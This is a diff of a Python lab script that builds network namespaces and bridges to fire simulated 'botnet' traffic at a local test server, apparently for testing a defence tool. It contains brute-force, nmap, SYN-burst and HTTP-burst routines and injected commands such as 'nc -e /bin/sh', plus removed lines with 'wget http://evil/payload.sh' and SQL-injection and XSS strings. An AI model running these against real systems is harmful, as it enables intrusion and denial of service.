@@ -1,33 +1,19 @@
 import subprocess
-import json
+import time
 
 
-ATTACKERS = [
-    {
-        "ns": "aegis_attacker1",
-        "veth_host": "veth1-host",
-        "veth_ns": "veth1-ns",
-        "host_ip": "10.200.1.1/24",
-        "ns_ip": "10.200.1.2/24",
-        "ns_ip_plain": "10.200.1.2"
-    },
-    {
-        "ns": "aegis_attacker2",
-        "veth_host": "veth2-host",
-        "veth_ns": "veth2-ns",
-        "host_ip": "10.200.2.1/24",
-        "ns_ip": "10.200.2.2/24",
-        "ns_ip_plain": "10.200.2.2"
-    },
-    {
-        "ns": "aegis_attacker3",
-        "veth_host": "veth3-host",
-        "veth_ns": "veth3-ns",
-        "host_ip": "10.200.3.1/24",
-        "ns_ip": "10.200.3.2/24",
-        "ns_ip_plain": "10.200.3.2"
-    }
+BRIDGE_NAME = "aegis-br0"
+BRIDGE_IP = "10.200.1.1/24"
+
+NAMESPACES = [
+    ("bot1", "10.200.1.11/24"),
+    ("bot2", "10.200.1.12/24"),
+    ("bot3", "10.200.1.13/24"),
+    ("bot4", "10.200.1.14/24"),
 ]
+
+TARGET_IP = "10.200.1.1"
+TARGET_PORT = 7200
 
 
 def run(cmd, check=False):
@@ -47,188 +33,242 @@ def run(cmd, check=False):
     return result
 
 
-def namespace_exists(ns_name):
+# =========================================================
+# HELPERS
+# =========================================================
+
+def ns_exists(name):
     result = run(["sudo", "ip", "netns", "list"])
-    return ns_name in result.stdout
+    return name in result.stdout
 
 
-def interface_exists(iface_name):
-    result = run(["ip", "link", "show", iface_name])
+def iface_exists(name):
+    result = run(["ip", "link", "show", name])
     return result.returncode == 0
 
 
+def bridge_exists():
+    return iface_exists(BRIDGE_NAME)
+
+
+def get_namespace_ips():
+    return [ip.split("/")[0] for _, ip in NAMESPACES]
+
+
+# =========================================================
+# LAB SETUP
+# =========================================================
+
 def setup_lab():
-    messages = []
+    print("\n🧪 Setting up Aegis multi-IP namespace lab...")
 
-    for attacker in ATTACKERS:
-        ns = attacker["ns"]
-        veth_host = attacker["veth_host"]
-        veth_ns = attacker["veth_ns"]
-        host_ip = attacker["host_ip"]
-        ns_ip = attacker["ns_ip"]
+    # Create bridge if missing
+    if not bridge_exists():
+        run(["sudo", "ip", "link", "add", BRIDGE_NAME, "type", "bridge"], check=True)
+        print(f"🛠️ Created bridge {BRIDGE_NAME}")
 
-        try:
-            if not namespace_exists(ns):
-                run(["sudo", "ip", "netns", "add", ns], check=True)
-                messages.append(f"Created namespace: {ns}")
-            else:
-                messages.append(f"Namespace already exists: {ns}")
+    # Assign bridge IP (ignore if already set)
+    run(["sudo", "ip", "addr", "add", BRIDGE_IP, "dev", BRIDGE_NAME], check=False)
 
-            if not interface_exists(veth_host):
-                run([
-                    "sudo", "ip", "link", "add",
-                    veth_host, "type", "veth", "peer", "name", veth_ns
-                ], check=True)
-                messages.append(f"Created veth pair: {veth_host} <-> {veth_ns}")
-            else:
-                messages.append(f"Host interface already exists: {veth_host}")
+    # Bring bridge up
+    run(["sudo", "ip", "link", "set", BRIDGE_NAME, "up"], check=True)
 
-            run(["sudo", "ip", "link", "set", veth_ns, "netns", ns], check=False)
+    # Create namespaces + veth pairs
+    for index, (ns_name, ns_ip) in enumerate(NAMESPACES, start=1):
+        host_veth = f"veth{index}h"
+        ns_veth = f"veth{index}n"
 
-            run(["sudo", "ip", "addr", "flush", "dev", veth_host], check=False)
-            run(["sudo", "ip", "addr", "add", host_ip, "dev", veth_host], check=False)
-            run(["sudo", "ip", "link", "set", veth_host, "up"], check=False)
+        if not ns_exists(ns_name):
+            run(["sudo", "ip", "netns", "add", ns_name], check=True)
+            print(f"📦 Created namespace {ns_name}")
 
-            run(["sudo", "ip", "netns", "exec", ns, "ip", "addr", "flush", "dev", veth_ns], check=False)
-            run(["sudo", "ip", "netns", "exec", ns, "ip", "addr", "add", ns_ip, "dev", veth_ns], check=False)
-            run(["sudo", "ip", "netns", "exec", ns, "ip", "link", "set", veth_ns, "up"], check=False)
-            run(["sudo", "ip", "netns", "exec", ns, "ip", "link", "set", "lo", "up"], check=False)
+        if not iface_exists(host_veth):
+            run(
+                ["sudo", "ip", "link", "add", host_veth, "type", "veth", "peer", "name", ns_veth],
+                check=True
+            )
+            print(f"🔌 Created veth pair {host_veth} <-> {ns_veth}")
 
-            messages.append(f"Configured {ns} with {ns_ip}")
+        # Move namespace side into namespace (ignore if already moved)
+        run(["sudo", "ip", "link", "set", ns_veth, "netns", ns_name], check=False)
 
-        except Exception as e:
-            messages.append(f"ERROR setting up {ns}: {e}")
+        # Attach host side to bridge
+        run(["sudo", "ip", "link", "set", host_veth, "master", BRIDGE_NAME], check=False)
+        run(["sudo", "ip", "link", "set", host_veth, "up"], check=False)
 
-    return {
-        "status": "ok",
-        "messages": messages
-    }
+        # Bring loopback up in namespace
+        run(["sudo", "ip", "netns", "exec", ns_name, "ip", "link", "set", "lo", "up"], check=False)
+
+        # Assign namespace IP
+        run(["sudo", "ip", "netns", "exec", ns_name, "ip", "addr", "add", ns_ip, "dev", ns_veth], check=False)
+
+        # Bring namespace veth up
+        run(["sudo", "ip", "netns", "exec", ns_name, "ip", "link", "set", ns_veth, "up"], check=False)
+
+        # Add route to bridge target
+        run(
+            ["sudo", "ip", "netns", "exec", ns_name, "ip", "route", "add", "default", "via", TARGET_IP],
+            check=False
+        )
+
+    print("✅ Namespace lab ready")
+    print(f"🎯 Target test server expected at http://{TARGET_IP}:{TARGET_PORT}")
 
 
-def destroy_lab():
-    messages = []
-
-    for attacker in ATTACKERS:
-        ns = attacker["ns"]
-        veth_host = attacker["veth_host"]
-
-        try:
-            if namespace_exists(ns):
-                run(["sudo", "ip", "netns", "delete", ns], check=False)
-                messages.append(f"Deleted namespace: {ns}")
-            else:
-                messages.append(f"Namespace not present: {ns}")
-
-            if interface_exists(veth_host):
-                run(["sudo", "ip", "link", "delete", veth_host], check=False)
-                messages.append(f"Deleted host interface: {veth_host}")
-            else:
-                messages.append(f"Host interface not present: {veth_host}")
-
-        except Exception as e:
-            messages.append(f"ERROR destroying {ns}: {e}")
-
-    return {
-        "status": "ok",
-        "messages": messages
-    }
-
+# =========================================================
+# LAB STATUS
+# =========================================================
 
 def lab_status():
-    status = []
+    status = {
+        "bridge": BRIDGE_NAME,
+        "bridge_exists": bridge_exists(),
+        "target_ip": TARGET_IP,
+        "target_port": TARGET_PORT,
+        "namespaces": []
+    }
 
-    for attacker in ATTACKERS:
-        ns = attacker["ns"]
-        veth_host = attacker["veth_host"]
-
-        ns_exists = namespace_exists(ns)
-        host_if_exists = interface_exists(veth_host)
-
-        status.append({
-            "namespace": ns,
-            "namespace_exists": ns_exists,
-            "host_interface": veth_host,
-            "host_interface_exists": host_if_exists,
-            "attacker_ip": attacker["ns_ip_plain"]
+    for ns_name, ns_ip in NAMESPACES:
+        status["namespaces"].append({
+            "name": ns_name,
+            "ip": ns_ip,
+            "exists": ns_exists(ns_name)
         })
 
-    return {
-        "status": "ok",
-        "attackers": status
-    }
+    return status
 
 
-def ping_host(attacker_index=0):
-    attacker = ATTACKERS[attacker_index]
-    ns = attacker["ns"]
-    target = attacker["host_ip"].split("/")[0]
+# =========================================================
+# ATTACK FUNCTIONS
+# =========================================================
 
-    return run([
-        "sudo", "ip", "netns", "exec", ns,
-        "ping", "-c", "4", target
-    ])
+def http_burst(ns_name, count=30):
+    """
+    Send multiple HTTP requests from one namespace.
+    """
+    print(f"🌐 HTTP burst from {ns_name}")
+
+    for _ in range(count):
+        run(
+            [
+                "sudo", "ip", "netns", "exec", ns_name,
+                "curl", "-s",
+                f"http://{TARGET_IP}:{TARGET_PORT}/"
+            ],
+            check=False
+        )
 
 
-def http_burst(attacker_index=0, target_url="http://10.200.1.1:7200"):
-    attacker = ATTACKERS[attacker_index]
-    ns = attacker["ns"]
+def payload_attack(ns_name):
+    """
+    Simulate suspicious command payload.
+    """
+    print(f"💣 Payload attack from {ns_name}")
 
-    cmd = (
-        f"for i in $(seq 1 20); do "
-        f"curl -s '{target_url}/' >/dev/null 2>&1; "
-        f"curl -s '{target_url}/login?user=admin&pass=guess{i}' >/dev/null 2>&1; "
-        f"curl -s '{target_url}/admin?token=badtoken{i}' >/dev/null 2>&1; "
-        f"curl -s '{target_url}/status' >/dev/null 2>&1; "
-        f"sleep 0.05; "
-        f"done"
+    run(
+        [
+            "sudo", "ip", "netns", "exec", ns_name,
+            "curl", "-s",
+            f"http://{TARGET_IP}:{TARGET_PORT}/cmd?cmd=nc%20-e%20/bin/sh"
+        ],
+        check=False
     )
 
-    return run([
-        "sudo", "ip", "netns", "exec", ns,
-        "bash", "-c", cmd
-    ])
+
+def login_bruteforce(ns_name, attempts=20):
+    """
+    Simulate repeated login attempts.
+    """
+    print(f"🔐 Login brute-force from {ns_name}")
+
+    for i in range(attempts):
+        run(
+            [
+                "sudo", "ip", "netns", "exec", ns_name,
+                "curl", "-s",
+                f"http://{TARGET_IP}:{TARGET_PORT}/login?user=admin&pass=wrong{i}"
+            ],
+            check=False
+        )
 
 
-def payload_attack(attacker_index=0, target_url="http://10.200.1.1:7200"):
-    attacker = ATTACKERS[attacker_index]
-    ns = attacker["ns"]
+def port_scan(ns_name):
+    """
+    Run an nmap scan from one namespace.
+    """
+    print(f"🛰️ Port scan from {ns_name}")
 
-    cmd = (
-        f"curl -s '{target_url}/cmd?cmd=nc -e /bin/sh' >/dev/null 2>&1; "
-        f"curl -s '{target_url}/cmd?cmd=/bin/bash -i' >/dev/null 2>&1; "
-        f"curl -s '{target_url}/cmd?cmd=wget http://evil/payload.sh' >/dev/null 2>&1; "
-        f"curl -s -X POST '{target_url}/upload' --data 'UNION SELECT * FROM users; <script>alert(1)</script>' >/dev/null 2>&1"
+    run(
+        [
+            "sudo", "ip", "netns", "exec", ns_name,
+            "nmap", "-Pn", "-p", "1-1000", TARGET_IP
+        ],
+        check=False
     )
 
-    return run([
-        "sudo", "ip", "netns", "exec", ns,
-        "bash", "-c", cmd
-    ])
+
+def syn_burst(ns_name, count=50):
+    """
+    Controlled SYN burst (not endless flood).
+    Safer than --flood.
+    """
+    print(f"⚡ SYN burst from {ns_name}")
+
+    run(
+        [
+            "sudo", "ip", "netns", "exec", ns_name,
+            "hping3", "-S", "-p", str(TARGET_PORT), "-c", str(count), TARGET_IP
+        ],
+        check=False
+    )
 
 
-def mixed_attack_all(targets=None):
-    if targets is None:
-        targets = [
-            "http://10.200.1.1:7200",
-            "http://10.200.2.1:7200",
-            "http://10.200.3.1:7200"
-        ]
+def mixed_attack_all():
+    """
+    Launch mixed attacks from all namespaces.
+    """
+    print("\n🔥 Starting multi-IP mixed botnet attack...\n")
 
-    outputs = []
+    for ns_name, _ in NAMESPACES:
+        port_scan(ns_name)
+        time.sleep(0.5)
 
-    for i, target in enumerate(targets):
-        try:
-            http_burst(i, target)
-            payload_attack(i, target)
-            outputs.append(f"Attacker {i+1} attacked {target}")
-        except Exception as e:
-            outputs.append(f"Attacker {i+1} failed: {e}")
+    for ns_name, _ in NAMESPACES:
+        login_bruteforce(ns_name, attempts=10)
+        time.sleep(0.3)
 
-    return {
-        "status": "ok",
-        "messages": outputs
-    }
+    for ns_name, _ in NAMESPACES:
+        payload_attack(ns_name)
+        time.sleep(0.3)
+
+    for ns_name, _ in NAMESPACES:
+        http_burst(ns_name, count=20)
+        time.sleep(0.2)
+
+    for ns_name, _ in NAMESPACES:
+        syn_burst(ns_name, count=20)
+        time.sleep(0.2)
+
+    print("\n✅ Multi-IP mixed attack completed")
 
 
-if __name__ == "__main__":
-    print(json.dumps(lab_status(), indent=2))
+# =========================================================
+# LAB DESTROY
+# =========================================================
+
+def destroy_lab():
+    print("\n🧹 Destroying Aegis namespace lab...")
+
+    # Delete namespaces
+    for ns_name, _ in NAMESPACES:
+        if ns_exists(ns_name):
+            run(["sudo", "ip", "netns", "del", ns_name], check=False)
+            print(f"🗑️ Removed namespace {ns_name}")
+
+    # Delete bridge
+    if bridge_exists():
+        run(["sudo", "ip", "link", "set", BRIDGE_NAME, "down"], check=False)
+        run(["sudo", "ip", "link", "del", BRIDGE_NAME], check=False)
+        print(f"🗑️ Removed bridge {BRIDGE_NAME}")
+
+    print("✅ Namespace lab destroyed")
